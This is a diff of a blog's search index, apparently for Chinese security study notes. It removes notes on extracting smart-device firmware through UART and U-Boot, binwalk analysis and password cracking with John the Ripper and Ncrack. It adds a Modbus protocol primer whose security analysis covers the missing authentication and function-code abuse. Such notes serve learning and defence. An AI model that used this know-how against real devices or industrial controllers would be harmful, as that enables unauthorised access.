@@ -1,198 +1,396 @@
 <?xml version="1.0" encoding="utf-8"?>
-<search>
-  <entry>
-    <title><![CDATA[智能设备硬件安全测试]]></title>
-    <url>%2F2018%2F08%2F02%2F%E6%99%BA%E8%83%BD%E8%AE%BE%E5%A4%87%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%2F</url>
-    <content type="text"><![CDATA[智能设备的组成 CPU: X86/ARM/MIPS/PPC等 内存: SDRAM/RAM 存储: Flash/TF卡/SD卡/MMC卡/硬盘 串口: 一般电路板会留，做调试用网口: 智能设备联网 USB口: 接U盘做扩展存储用、也可接键盘和鼠标等 无线接口: Wifi/蓝牙/ZigeBee等 bootLoader: Uboot等 操作系统: Linux/RT-Linux/VxWorks/uCOS-I 智能硬件设备测试简要流程1、获取固件2、逆向固件3、分析固件漏洞/调试固件/Fuzz漏洞4、漏洞验证(这一步要有硬件)5、完成测试文档 智能设备固件获取方法1、官网或联系售后索取升级包2、在线升级, 抓包获取下载地址3、逆向升级软件,软件内置解包和通讯算法4、从硬件调试接口:JTAG/SWD, 利用调试工具的任意地址读取功能5、拆Flash、Sd卡、TF卡、硬盘等,用编程器或对应设备读固件6、用硬件电路的调试串口和固件的bootloader获取固件7、通过利用网页和通讯漏洞获取固件敏感信息8、用逻辑分析仪监听flash,ram获取信息9、从串口进入系统后,用tar、nc、dd、echo、vi等命令提取 拆Flash后,用编程器获取固件只需要三步, 但对大部分人很困难:(1)焊下flash芯片(2)用编程器提取固件内容(3)把FLASH芯片焊回电路板 从串口(UART)调试口获取固件 前提: 开发板上有串口调试接，需要我们找出隐藏的串口。 串口按照电压有两种标准：RS232标准和TTL标准 RS232标准： 电压范围：-12V，+12V （负逻辑） TTL标准： 电压范围：0，5V 串口引脚识别方法: 串口一般有4个引脚 VCC：电源电压为3.3V 或 5V GND：电源电压地 RXD：数据接收引脚，万用表测电压为低（如硬件上拉可为高） TXD：数据发送引脚，万用表测电压一般为高 试验: 用万用表找串口 从串口进入系统 SecureCRT的使用 通过开发留下的串口, 进入系统 尝试运行系统的调试命令 学习串口日志的记录和回看方法 从串口uboot提取固件流程(1)获取flash固件信息(2)用md命令提取固件信息(3)记录串口输出信息(4)分析输出信息,获取固件 uboot提取固件: md命令md - memory display (显示内存RAM/SDRAM内容)用法: md 起始地址 长度 （地址和长度为十六进制格式）思考: md 命令是否能提取固件？ 怎么提取固件呢？可以先把flash中的内容拷贝到内存，再从内存打印 固件提取技术 Binwalk提取文件命令：binwalk -e firmware.bin命令：binwalk -Me firmware.bin命令：binwalk -Me firmware.bin命令：binwalk -Me -d 5 firmware.bin IDA proIDA Pro（简称IDA）是一款交互式反汇编工具IDA最主要的特性是交互和多处理器IDA支持的文件类型非常丰富除了常见的PE格式，还支持Windows,DOS,UNIX,Mac,Java,.NET等平台文件格式。 retdec反编译器不限于任何特定的目标架构，操作系统或可执行文件格式：支持的文件格式：ELF，PE，Mach-O，COFF，AR（存档），Intel HEX和原始机器码。支持的体系结构（仅限32b）：Intel x86，ARM，MIPS，PIC32和Power 敏感信息收集工具FirmwalkerFirmwalker是一个非常棒的固件分析入手工具，能够帮您找到感兴趣的文件，以便进行更深入的分析 固件的弱密码Linux密码文件/etc/passwd 密码的前两位是”盐”值，是一个随机数，后面跟的是加密的密码/etc/shadow 只有root可读 /etc/passwd文件简介adm拥有账号文件，起始目录/var/adm通常包括日志文件bin拥有用户命令的可执行文件daemon用来执行系统守护进程games用来玩游戏halt用来执行halt命令lp拥有打印机后台打印文件mail拥有与邮件相关的进程和文件news拥有与usenet相关的进程和文件nobody被NFS（网络文件系统）使用shutdown执行shutdown命令sync执行sync命令uucp拥有uucp工具和文件 实用破解法：社工字典法 John the Ripper（john-1.8.0）John是一款快速密码破解工具，目前支持Unix,Windows,DOS,BeOS和OpenVMS主要目的是用于发现Unix弱密码另外支持许多密码hash类型，如unix系统、windows的LMhash等 固件漏洞挖掘Ncrack是一个高速的网络认证破解工具，它可以帮助企业测试所有的网络主机和网络设备的密码强度，提高企业网络的安全性。安全专业人员也可使用 Ncrack做渗透测试。Ncrack支持windows和linux系统，并且可以测试暴力破解测试，支持的协议包括RDP、 SSH、 HTTP(s)、 SMB、POP3(s)、 VNC、 FTP, SIP、 Redis、 PostgreSQL、MySQL 以及Telnet。]]></content>
+<search> 
+  
+    
+    <entry>
+      <title>Modbus学习笔记</title>
+      <link href="/2018/08/03/Modbus%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
+      <url>/2018/08/03/Modbus%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
+      <content type="html"><![CDATA[<h1 id="术语"><a href="#术语" class="headerlink" title="术语"></a>术语</h1><p><img src="\images\pasted-191.png" alt="upload successful"></p><h2 id="校验码"><a href="#校验码" class="headerlink" title="校验码"></a>校验码</h2><p>校验码是由前面的数据通过某种算法得出的，用以检验该组数据的正确性。代码作为数据在向计算机或其它设备进行输入时，容易产生输入错误，为了减少这种输入错误，编码专家发明了各种校验检错方法，并依据这些方法设置了校验码。<br>常用的校验有：累加和校验SUM、字节异或校验XOR、纵向冗余校验LRC、循环冗余校验CRC……<br><img src="\images\pasted-189.png" alt="upload successful"><br><img src="\images\pasted-190.png" alt="upload successful"></p><h2 id="离散量输入"><a href="#离散量输入" class="headerlink" title="离散量输入"></a>离散量输入</h2><p>主要用来读取单个位的数据，如IO的状态；</p><h2 id="线圈"><a href="#线圈" class="headerlink" title="线圈"></a>线圈</h2><p>开关输出信号，主要用来写入单个位的数据，与离散量构成组成对位的操作；</p><h2 id="输入寄存器"><a href="#输入寄存器" class="headerlink" title="输入寄存器"></a>输入寄存器</h2><p>主要用来读取16位，也就是两个字节的数据；</p><h2 id="保持寄存器"><a href="#保持寄存器" class="headerlink" title="保持寄存器"></a>保持寄存器</h2><p>主要用来写入16位的数据。</p><h2 id="PLC"><a href="#PLC" class="headerlink" title="PLC"></a>PLC</h2><p>可编程逻辑控制器，是一种采用一类可编程的存储器，用于其内部存储程序，执行逻辑运算、顺序控制、定时、计数与算术操作等面向用户的指令，并通过数字或模拟式输入/输出控制各种类型的机械或生产过程。</p><h2 id="串口通信"><a href="#串口通信" class="headerlink" title="串口通信"></a>串口通信</h2><p>随着计算机系统的应用和微机网络的发展，通信功能越来越显得重要.这里所说的通信是指计算机与外界的信息交换.因此，通信既包括计算机与外部设备之间，也包括计算机和计算机之间的信息交换.由于串行通信是在一根传输线上一位一位的传送信息，所用的传输线少，并且可以借助现成的电话网进行信息传送，因此，特别适合于远距离传输.对于那些与计算机相距不远的人－机交换设备和串行存储的外部设备如终端、打印机、逻辑分析仪、磁盘等，采用串行方式交换数据也很普遍.在实时控制和管理方面，采用多台微机处理机组成分级分布控制系统中，各 CPU 之间的通信一般都是串行方式.所以串行接口是微机应用系统常用的接口。许多外设和计算机按串行方式进行通信，这里所说的串行方式，是指外设与接口电路之间的信息传送方式，实际上，CPU 与接口之间仍按并行方式工作.</p><h2 id="串口"><a href="#串口" class="headerlink" title="串口"></a>串口</h2><p>串口是计算机上一种非常通用设备通信的协议，不要与通用串行总线Universal Serial Bus（USB）混淆。大多数计算机包含两个基于RS232的串口。串口同时也是仪器仪表设备通用的通信协议；很多GPIB兼容的设备也带有RS-232口。同时，串口通信协议也可以用于获取远程采集设备的数据。<br>串口通信的概念非常简单，串口按位（bit）发送和接收字节。尽管比按字节（byte）的并行通信慢，但是串口可以在使用一根线发送数据的同时用另一根线接收数据。它很简单并且能够实现远距离通信。比如IEEE488定义并行通行状态时，规定设备线总常不得超过20米，并且任意两个设备间的长度不得超过2米；而对于串口而言，长度可达1200米。<br>典型地，串口用于ASCII码字符的传输。通信使用3根线完成：（1）地线，（2）发送，（3）接收。由于串口通信是异步的，端口能够在一根线上发送数据同时在另一根线上接收数据。其他线用于握手，但是不是必须的。串口通信最重要的参数是波特率、数据位、停止位和奇偶校验。对于两个进行通行的端口，这些参数必须匹配：   </p><h3 id="波特率"><a href="#波特率" class="headerlink" title="波特率"></a>波特率</h3><p>这是一个衡量通信速度的参数。它表示每秒钟传送的bit的个数。例如300波特表示每秒钟发送300个bit。当我们提到时钟周期时，我们就是指波特率。例如如果协议需要4800波特率，那么时钟是4800Hz。这意味着串口通信在数据线上的采样率为4800Hz。通常电话线的波特率为14400，28800和36600。波特率可以远远大于这些值，但是波特率和距离成反比。高波特率常常用于放置的很近的仪器间的通信，典型的例子就是GPIB设备的通信。 </p><h3 id="数据位"><a href="#数据位" class="headerlink" title="数据位"></a>数据位</h3><p>这是衡量通信中实际数据位的参数。当计算机发送一个信息包，实际的数据不会是8位的，标准的值是5、7和8位。如何设置取决于你想传送的信息。比如，标准的ASCII码是0～127（7位）。扩展的ASCII码是0～255（8位）。如果数据使用简单的文本（标准 ASCII码），那么每个数据包使用7位数据。每个包是指一个字节，包括开始/停止位，数据位和奇偶校验位。由于实际数据位取决于通信协议的选取，术语“包”指任何通信的情况。 </p><h3 id="停止位"><a href="#停止位" class="headerlink" title="停止位"></a>停止位</h3><p>用于表示单个包的最后一位。典型的值为1，1.5和2位。由于数据是在传输线上定时的，并且每一个设备有其自己的时钟，很可能在通信中两台设备间出现了小小的不同步。因此停止位不仅仅是表示传输的结束，并且提供计算机校正时钟同步的机会。适用于停止位的位数越多，不同时钟同步的容忍程度越大，但是数据传输率同时也越慢。 </p><h3 id="奇偶校验位"><a href="#奇偶校验位" class="headerlink" title="奇偶校验位"></a>奇偶校验位</h3><p>在串口通信中一种简单的检错方式。有四种检错方式：偶、奇、高和低。当然没有校验位也是可以的。对于偶和奇校验的情况，串口会设置校验位（数据位后面的一位），用一个值确保传输的数据有偶个或者奇个逻辑高位。例如，如果数据是011，那么对于偶校验，校验位为0，保证逻辑高的位数是偶数个。如果是奇校验，校验位位1，这样就有3个逻辑高位。高位和低位不真正的检查数据，简单置位逻辑高或者逻辑低校验。这样使得接收设备能够知道一个位的状态，有机会判断是否有噪声干扰了通信或者是否传输和接收数据是否不同步。<br><img src="\images\pasted-188.png" alt="upload successful"><br><br><br></p><h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>早在1971年，Modicon公司首次推出了Modbus协议，ModbusRTU和Modbus ASCII诞生于此。后来施耐德电气（SchneiderElectric）收购了Modicon公司，并在1997年推出了ModbusTCP协议。2004年，中国国家标准委员会正式把Modbus作为了国家标准，开启了Modbus为中国工业通信做贡献的时代。<br>通过此协议，控制器相互之间、控制器经由网络和其它设备之间可以通信。Modbus协议具有标准、开放，可以支持多种电气接口，数据帧格式简单紧凑，数据传输量大、实时性好等特点，在工业控制系统中得到了广泛的应用，已经成为通用工业标准。深入分析Modbus协议实现原理和其安全性对提高工控系统安全性有着重要的现实意义。ModbusRTU和ModbusASCII主要用于串行通信领域，而ModbusTCP则常用于以太网通信。现在，Modbus已经成为工业领域通信协议标准，并且现在是工业电子设备之间相当常用的连接方式。<br><img src="\images\pasted-181.png" alt="upload successful"><br><br><br></p><h1 id="协议原理"><a href="#协议原理" class="headerlink" title="协议原理"></a>协议原理</h1><p>Modbus使用一种简单的MasterandSlave主从协议（客户机/服务器协议）进行通信。客户机作为主站，向服务器发送请求；服务器（从站）接到请求后，对请求进行分析并作出应答。其中使用的通信帧被称为应用数据单元（Application Data Unit，ADU），它包括通信地址段、功能代码段、数据段和校验段，如下图：<br><img src="\images\pasted-182.png" alt="upload successful"><br>一般使用上，监控系统(HMI)都为Master，PLC、电表、仪表等都为Slave，HMI系统一直PollingSlave的各种relayandregister最新数值，然后做显示及各种逻辑计算及控制调整等处理。<br>其中，功能代码段和数据段组合称为协议数据单元（Protocol Data Unit or Protocol Description Unit)，PDU）。功能代码段占用一个字节，取值范围为1~255，其中128~255为保留值，用于异常消息应答报文。1~127为功能代码编号，其中65~72和100~110为用户自定义编码，具体请看下面这张图片：<br><br><br><br></p><h1 id="传输方式"><a href="#传输方式" class="headerlink" title="传输方式"></a>传输方式</h1><p>Modbus 协议是一种应用层报文传输协议，包括ASCII、ＲTU、TCP三种报文类型，协议本身并没有定义物理层，只是定义了控制器能够认识和使用的消息结构，而不管它们是经过何种网络进行通信的。<br>Modbus 协议使用串口传输时可以选择ＲTU或ASCII模式，并规定了消息、数据结构、命令和应答方式并需要对数据进行校验。ASCII 模式采用LＲC校验，ＲTU模式采用16 位CＲC校验。通过以太网传输时使用TCP，这种模式不使用校验，因为TCP协议是一个面向连接的可靠协议。<br><br><br><br></p><h1 id="Modbus-RTU和Modbus-ASCII有什么区别？"><a href="#Modbus-RTU和Modbus-ASCII有什么区别？" class="headerlink" title="Modbus RTU和Modbus ASCII有什么区别？"></a>Modbus RTU和Modbus ASCII有什么区别？</h1><p>Modbus是一种应用层协议，它定义了与基础网络无关的数据单元（ADU），可以在以太网（TCP/IP）或串行链路上（RS232、RS485等）进行通信（以太网ADU和串行ADU略有不同）。在串行链路上，Modbus协议有两种传输模式——ASCII模式和RTU模式。其中，ASCII是英文“American Standard Code for Information Interchange”的缩写，中文翻译为“美国国家信息交换标准编码”；RTU是英文“ Remote Terminal Unit”的缩写，中文翻译为“远程终端设备”。<br>首先，让我们来看看Modbus的工作原理。<br>Modbus采用主从（Master-Salve）通信模式，仅有主设备（Master）能对传输进行初始化，从设备（Slave）根据主设备的请求进行应答。典型的主设备包括现场仪表和显示面板，典型的从设备为可编程逻辑控制器（PLC）。<br>在串行链路的主从通信中，Modbus主设备可以连接一个或N（最大为247）个从设备，主从设备之间的通信包括单播模式和广播模式。<br>在广播模式中，Modbus主设备可同时向多个从设备发送请求（设备地址0用于广播模式），从设备对广播请求不进行响应。<br>在单播模式中，主设备发送请求至某个特定的从设备（每个Modbus从设备具有唯一地址），请求的消息帧中会包含功能代码和数据，比如功能代码“01”用来读取离散量线圈的状态。从设备接到请求后，进行应答并把消息反馈主设备。<br><img src="\images\pasted-183.png" alt="upload successful"><br><strong><em>在主从设备的通信中，可以使用ASCII模式或者RTU模式。</em></strong><br>在ASCII（AmericanStandard Code for Information Interchange）传输模式下，消息帧以英文冒号（“：”，ASCII3A Hex）开始，以回车和换号（CRLF，ASCII 0D and 0A Hex）符号结束，允许的传输的字符集为十六进制的0~9和A~F；网络中的从设备监视传输通路上是否有英文冒号（“：”），如果有的话，就对消息帧进行解码，查看消息中的地址是否与自己的地址相同，如果相同的话，就接收其中的数据；如果不同的话，则不予理会。<br><img src="\images\pasted-184.png" alt="upload successful"><br>在ASCII模式下，每个8位的字节被拆分成两个ASCII字符进行发送，比如十六进制数0xAF ,会被分解成ASCII字符“A”和“F”进行发送，发送的字符量比RTU增加一倍。ASCII模式的好处是允许两个字符之间间隔的时间长达1s而不引发通信故障，该模式采用纵向冗余校验（Longitudinal Redundancy Check ，LRC)） 的方法来检验错误，当控制器设为在Modbus 网络上以ＲTU 模式通信，消息中的每个8Bit 字节都包含两个4 Bit 的十六进制字符，这种模式没有开始和结束标记。其优点是: 在同样的波特率下，可比传送更多的数据。<br>在RTU（RemoteTerminal Unit）模式下，每个字节可以传输两个十六进制字符，比如十六进制数0xAF，直接以十六进制0xAF（二进制：10101111）进行发送，因此它的发送密度比ASCII模式高一倍；RTU模式采用循环冗余校验（CRC），下面是对RTU模式的总结：<br>具体格式如图 所示。<br><img src="\images\pasted-185.png" alt="upload successful"><br><br><br></p><h1 id="MODBUS-TCP注意点"><a href="#MODBUS-TCP注意点" class="headerlink" title="MODBUS TCP注意点"></a>MODBUS TCP注意点</h1><h2 id="主机和从机、服务端和客户端"><a href="#主机和从机、服务端和客户端" class="headerlink" title="主机和从机、服务端和客户端"></a>主机和从机、服务端和客户端</h2><h3 id="【在modbus协议中】"><a href="#【在modbus协议中】" class="headerlink" title="【在modbus协议中】"></a>【在modbus协议中】</h3><p>主机发送modbus请求，从机根据请求内容向主机返回响应。在modbus协议中，主机总是主动方，从机总是被动方。</p><h3 id="【在网络应用中】"><a href="#【在网络应用中】" class="headerlink" title="【在网络应用中】"></a>【在网络应用中】</h3><p>在网络应用中存在客户端和服务器端，客户端（例如浏览器）发送请求到服务器，服务器向客户端返回内容（例如HTML文本）。</p><h3 id="【在modbus-tcp中】"><a href="#【在modbus-tcp中】" class="headerlink" title="【在modbus tcp中】"></a>【在modbus tcp中】</h3><p>主机是客户端，而从机是服务器端。千万不要以为服务器端重要，主机也重要，所以主机就是服务器端。</p><h2 id="是否可以多主机"><a href="#是否可以多主机" class="headerlink" title="是否可以多主机"></a>是否可以多主机</h2><p>通过前面的分析，主机为客户端那么modbustcp支持多个主机，在一个局域网中可存在多个主机和多个从机。从机的连接能力（连接主机的数量）由uIP的最大TCP连接个数决定。</p><h2 id="modbus-TCP协议简述"><a href="#modbus-TCP协议简述" class="headerlink" title="modbus TCP协议简述"></a>modbus TCP协议简述</h2><p>modbus TCP和modbus RTU基本相同，但是也存在一些区别<br>a.从机地址变得不再重要，多数情况下忽略。从某种意义上说从机地址被IP地址取代<br>b.CRC校验变得不再重要，甚至可以忽略。由于TCP数据包中已经存在校验，为了不重复造轮子，modbus TCP干脆取消了CRC校验。<br>TCP 模式是为了让Modbus 数据顺利在以太网上传输产生的，使用TCP502 端口。该协议物理层，数据链路层，网络层，传输层都是基于TCP 协议，只在应用层，将Modbus 协议修改后封装进去; 接收端将该TCP 数据包拆封后，重新获得原始Modbus 帧，然后按照Modbus 协议规范进行解析，并将返回的数据包重新封装进TCP 协议中，返回到发送端。与串行链路传输的数据格式不同，TCP 模式去除了附加地址和校验，增加了报文头，其具体格式如下图所示。<br><img src="\images\pasted-186.png" alt="upload successful"><br><strong><em>在modbus TCP中包含一个MBAP头，该头包含以下几个部分</em></strong></p><table><thead><tr><th>区域</th><th>长度</th><th>描述</th><th>客户端</th><th>服务器</th></tr></thead><tbody><tr><td>传输标志</td><td>2字节</td><td>MODBUS 请求和响应传输过程中序列号</td><td>客户端生成</td><td>应答时复制该值</td></tr><tr><td>协议标志</td><td>2字节</td><td>Modbus协议默认为0</td><td>客户端生成</td><td>应答时复制该值</td></tr><tr><td>长度</td><td>2字节</td><td>剩余部分的长度</td><td>客户端生成</td><td>应答时由服务器端生成</td></tr><tr><td>单元标志</td><td>1字节</td><td>从机标志（从机地址）</td><td>客户端生成</td><td>应答时复制该值</td></tr></tbody></table><ul><li>【注意】</li><li>【1】传输标志可理解为序列号，防止 MODBUS TCP通信错位，例如后发生的响应先到了主机，而早发生的响应后到主机</li><li>【2】单元标志可理解为从机地址，此时已经不再重要</li></ul><h2 id="modbus-tcp-和-TCP-IP的关系"><a href="#modbus-tcp-和-TCP-IP的关系" class="headerlink" title="modbus tcp 和 TCP IP的关系"></a>modbus tcp 和 TCP IP的关系</h2><p>modbus TCP可以理解为发生在TCP上的应用层协议，既然是TCP协议那么一个完整的MODBUSTCP报文必然包括TCP首部，IP首部和Ethernet首部。<br><br><br><br></p><h1 id="功能码作用"><a href="#功能码作用" class="headerlink" title="功能码作用"></a>功能码作用</h1><p>启动Modbus事务处理的客户机创建Modbus应用数据单元。功能码（PDU中的）向服务器指示将执行哪种操作。<br>用一个字节编码Modbus数据单元的功能码域。有效范围是十制制1-255（128-255为异常响应保留）。当从客户机向服务器发送报文时，功能码域通过服务器执行哪种操作。<br>从客户机向服务器发送的报文数据域包括附加信息，服务器使用这个信息执行功能码定义的操作。这个域还包括离散项目和寄存器地址、处理项目的数量以及域中的实际数据字节数。<br>在某种请求中，数据域可以是不存在的，在此情况下服务器不需要任何附加信息。功能码仅说明操作。  </p><h2 id="功能码的类型"><a href="#功能码的类型" class="headerlink" title="功能码的类型"></a>功能码的类型</h2><p>功能码主要分为有效功能码、异常功能码和错误功能码。<br>如果在一个正确接收Modbus ADU中，不出现与请求Modbus功能有关的差错，那么服务器至客户机的响应数据会包含请求中的正常功能码。如果出现与请求Modbus功能有关的差错，那么响应数据会包含一个异常码和错误码。<br>例如，客户机能够读一组离散量输出或输入的开/关状态，或者用户能够读/写一组寄存器数据内容。当服务器对客户机响应时，它使用功能码域来指示正常（无差错）响应或出现某种差错（称为异常响应）。对于一个正常响应来说，服务器仅对原始功能码响应，<br>对于异常响应，服务器返回一个与客户机等同的码，设置该原始功能码的最高有效位为逻辑1，并加该异常码后增加错误码，以通知客户机异常原因。</p><h2 id="有效功能码"><a href="#有效功能码" class="headerlink" title="有效功能码"></a>有效功能码</h2><p>有效功能码有二十几种，但是一般使用上都以1、2、3、4、5、6、15、16等八种最为常用，以及另外特殊使用的20、21两种，此为General Reference Register，绝大部份的Modbus设备并不会提供此Register。于PLC上主要的控制数据有下列四种型式。此八种功能码就是处理这些控制资料，详细说明如下各点：</p><h2 id="控制数据四种型式"><a href="#控制数据四种型式" class="headerlink" title="控制数据四种型式"></a>控制数据四种型式</h2><p><strong><em>DI：DigitalInput</em></strong> （数字输入，离散输入），一个地址一个数据位，用户只能读取它的状态，不能修改。以一个 bit表示 On/Off，用来记录控制信号的状态输入，例如：开关，接触点，马达运转，超限switch…等等。于PLC上被称为Input relay、input coil等。<br><strong><em>DO：DigitalOutput</em></strong>（数字输出，线圈输出），一个地址一个数据位，用户可以置位、复位，可以回读状态。以一个 bit表示 On/Off，用来输出控制信号，以激活或停止马达，警铃，灯光…等等。于PLC上被称为Output relay、Output coil等。<br><strong><em>AI：Analog Input</em></strong>（模拟输入，输入寄存器），一个地址16位数据，用户只能读，不能修改，，以16 bits integer表示一个数值，用来记录控制信号的数值输入，例如：温度、流量、料量、速度、转速、文件板开度、液位、重量…等等。于PLC上被称为Input register。<br><strong><em>AO：AnalogOutput</em></strong>（模拟输出，保持寄存器），一个地址16位数据，用户可以写，也可以回读，以16 bits integer表示一个数值，用来输出控制信号的数值，例如：温度、流量、速度、转速、文件板开度、饲料量…等等设定值。于PLC上被称为Output register、Holding register。<br><img src="\images\pasted-187.png" alt="upload successful"><br><br><br></p><h1 id="Modbus-协议安全性分析"><a href="#Modbus-协议安全性分析" class="headerlink" title="Modbus 协议安全性分析"></a>Modbus 协议安全性分析</h1><p>Modbus 协议是典型的工控网协议，研究其安全性对于加强工业控制网络的安全性有重要意义。一般来说，协议安全性问题可以分为两种，一种是协议自身的设计和描述引起的安全问题; 另一种是协议的不正确实现引起的安全问题。Modbus 协议也存在着这两方面的问题。</p><h2 id="Modbus-协议的固有问题"><a href="#Modbus-协议的固有问题" class="headerlink" title="Modbus 协议的固有问题"></a>Modbus 协议的固有问题</h2><p>绝大多数工控协议在设计之初，仅仅考虑了功能实现、提高效率、提高可靠性等方面，而没考虑过安全性问题。Modbus 协议也不例外，尽管其已经成为事实上的工业标准。从前面原理分析可以看出其本身的安全性问题是: 缺乏认证、授权、加密等安全防护机制和功能码滥用问题。  </p><h3 id="缺乏认证"><a href="#缺乏认证" class="headerlink" title="缺乏认证"></a>缺乏认证</h3><p>认证的目的是保证收到的信息来自合法的用户，未认证用户向设备发送控制命令不会被执行。在Modbus 协议通信过程中，没有任何认证方面的相关定义，攻击者只需要找到一个合法的地址就可以使用功能码就能建立一个Modbus 通信会话，从而扰乱整个或者部分控制过程。</p><h3 id="缺乏授权"><a href="#缺乏授权" class="headerlink" title="缺乏授权"></a>缺乏授权</h3><p>授权是保证不同的特权操作需要由拥有不同权限的认证用户来完成，这样可大大降低误操作与内部攻击的概率。目前，Modbus 协议没有基于角色的访问控制机制，也没有对用户分类，没有对用户的权限进行划分，这会导致任意用户可以执行任意功能。</p><h3 id="缺乏加密"><a href="#缺乏加密" class="headerlink" title="缺乏加密"></a>缺乏加密</h3><p>加密可以保证通信过程中双方的信息不被第三方非法获取。Modbus 协议通信过程中，地址和命令全部采用明文传输，因此数据可以很容易的被攻击者<br>捕获和解析，为攻击者提供便利。</p><h3 id="功能码滥用"><a href="#功能码滥用" class="headerlink" title="功能码滥用"></a>功能码滥用</h3><p>功能码是Modbus 协议中的一项重要内容，几乎所有的通信都包含功能码。目前，功能码滥用是导致Modbus 网络异常的一个主要因素。<strong><em>例如不合法报文长度，短周期的无用命令，不正确的报文长度，确认异常代码延迟等都有可能导致拒绝服务攻击。</em></strong></p><h2 id="协议实现产生的问题"><a href="#协议实现产生的问题" class="headerlink" title="协议实现产生的问题"></a>协议实现产生的问题</h2><p>虽然Modbus 协议获得了广泛的应用，但是在实现具体的工业控制系统时，开发者并不具备安全知识或者没有意识到安全问题。这样就导致了使用Modbus 协议的系统中可能存在各种各样的安全漏洞。</p><h3 id="设计安全问题"><a href="#设计安全问题" class="headerlink" title="设计安全问题"></a>设计安全问题</h3><p>Modbus 系统开发者重点关注的是其功能实现问题，安全问题在设计时很少被注意到。设计安全是指设计时充分考虑安全性，解决Modbus 系统可能出现的各种异常和非法操作等问题。比如在通信过程中，某个节点被恶意控制后发出非法数据，就需要考虑这些数据的判别和处理问题。</p><h3 id="缓冲区溢出漏洞"><a href="#缓冲区溢出漏洞" class="headerlink" title="缓冲区溢出漏洞"></a>缓冲区溢出漏洞</h3><p>缓冲区溢出是指在向缓冲区内填充数据时超过了缓冲区本身的容量导致溢出的数据覆盖在合法数据上，这是在软件开发中最常见也是非常危险的漏洞，可以导致系统崩溃，或者被攻击者利用来控制系统。Modbus 系统开发者大多不具备安全开发知识，这样就会产生很多的缓冲区溢出漏洞，一旦被恶意者利用会导致严重的后果。</p><h3 id="Modbus-TCP-安全问题"><a href="#Modbus-TCP-安全问题" class="headerlink" title="Modbus TCP 安全问题"></a>Modbus TCP 安全问题</h3><p>目前，Modbus 协议已经可以在通用计算机和通用操作系统上实现，运行于TCP /IP 之上以满足发展需要。这样，TCP /IP 协议自身存在的安全问题不可避免地会影响到工控网络安全。非法网络数据获取，中间人，拒绝服务， IP 欺骗，病毒木马等在IP 互联网中的常用攻击手段都会影响Modbus 系统安全。</p><h2 id="安全建议"><a href="#安全建议" class="headerlink" title="安全建议"></a>安全建议</h2><p>目前，Modbus 系统采取的安全防护措施普遍不足，这里参考信息安全业内研究并结合工控系统自身的安全问题，提出了一些安全建议，能够有效地降低工业控制系统面临的威胁。</p><h3 id="从源头开始"><a href="#从源头开始" class="headerlink" title="从源头开始"></a>从源头开始</h3><p>工控网络漏洞，很大一部分是其实现过程出现的漏洞。如果从源头开始控制，从Modbus 系统的需求设计、开发实现、内部测试和部署等阶段，全生命周期的介入安全手段，融入安全设计、安全编码以及安全测试等技术，可以极大地消除安全漏洞，降低整个Modbus 系统的安全风险。</p><h3 id="异常行为检测"><a href="#异常行为检测" class="headerlink" title="异常行为检测"></a>异常行为检测</h3><p>异常行为代表着可能发生威胁，不管是有没有攻击者，因此开发针对Modbus 系统的专用异常行为检测设备可以极大提高工控网络的安全性。针对Modbus 系统，首先要分析其存在的各种操作行为，依据“主体，地点，时间，访问方式，操作，客体”等行为描述成一个六元组模型; 进而分析其行为是否属于异常; 最终决定采取记录或者报警等措施。</p><h3 id="安全审计"><a href="#安全审计" class="headerlink" title="安全审计"></a>安全审计</h3><p>Modbus 的安全审计就是对协议数据进行深度解码分析，记录操作的时间、地点、操作者和操作行为等关键信息，实现对Modbus 系统的安全审计日志记录和审计功能，从而提供安全事件爆发后的时候追查能力。</p><h3 id="使用网络安全设备"><a href="#使用网络安全设备" class="headerlink" title="使用网络安全设备"></a>使用网络安全设备</h3><p>使用入侵防御和防火墙等网络安全设备。防火墙是一个串行设备，通过设置，只允许特定的地址访问服务端，禁止外部地址访问Modbus 服务器，可以有效的防止外部入侵; 入侵防御设备可以分析Modbus协议的具体操作内容，有效地检测并阻止来自内部/外部的异常操作和各种渗透攻击行为，对内网提供保护功能。<br><br><br><br><br>PS：本篇文章转载自<a href="http://www.freebuf.com/articles/ics-articles/148637.html" target="_blank" rel="noopener">FREEBUF</a></p>]]></content>
+      
       <categories>
-        <category>工控安全</category>
+          
+          <category> 工控安全 </category>
+          
       </categories>
-      <tags>
-        <tag>固件分析</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[Django学习笔记_4]]></title>
-    <url>%2F2018%2F07%2F29%2FDjango%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-4%2F</url>
-    <content type="text"><![CDATA[Templates 模板 模板处理 快捷函数 定义模板模板语言包括 变量 标签 过滤器 { % 代码块 %} 注释 变量在模板中调用对象的方法标签过滤器注释 模板继承 说明 三层继承模型 HTML转义 会被自动转义的字符 关闭转义 字符串字面值 CSRF 验证码 验证码视图 配置url 显示验证码 验证 第三方 可以在网上搜索“验证码”，找到一些第三方验证码提供网站，阅读文档，使用到项目中]]></content>
+      
+      
+        <tags>
+            
+            <tag> modbus </tag>
+            
+            <tag> 工控协议 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    <entry>
+      <title>智能设备硬件安全测试</title>
+      <link href="/2018/08/02/%E6%99%BA%E8%83%BD%E8%AE%BE%E5%A4%87%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/"/>
+      <url>/2018/08/02/%E6%99%BA%E8%83%BD%E8%AE%BE%E5%A4%87%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/</url>
